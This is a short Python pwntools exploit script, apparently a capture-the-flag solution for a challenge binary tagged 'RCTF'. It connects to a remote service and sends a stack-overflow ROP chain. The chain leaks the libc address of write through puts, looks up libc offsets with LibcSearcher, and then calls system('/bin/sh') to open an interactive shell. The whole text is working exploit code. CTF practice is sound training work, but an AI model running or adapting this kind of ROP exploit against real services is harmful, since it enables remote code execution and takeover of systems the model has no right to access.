from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn')
# io = process('./pwn')
io = remote('111.200.241.244', 63578)

pop_rdi_ret_addr = 0x4008A3
pop3_addr = 0x40089F
pop4_addr = 0x40089C
main_addr = 0x4007CD
echo_addr = 0x40071D
printf_addr = 0x4007BC
puts_addr = 0x4007B0
pop_rsir15_ret_addr = 0x4008A1

payload1 = cyclic(0x18) + p64(pop4_addr) + p64(pop_rdi_ret_addr) + \
		   p64(elf.got['write']) + p64(elf.plt['puts']) + \
		   p64(main_addr)
io.send(payload1)
io.recvuntil(b'RCTF\n')
write_addr = u64(io.recv()[-7:-1] + b'\x00' * 2)
libc = LibcSearcher('write', write_addr)
offset = write_addr - libc.dump('write')
system_addr = offset + libc.dump('system')
bin_sh_addr = offset + libc.dump('str_bin_sh')

payload2 = cyclic(0x18) + p64(pop4_addr) + p64(pop_rdi_ret_addr) + \
		   p64(bin_sh_addr) + p64(system_addr)
io.send(payload2)
io.interactive()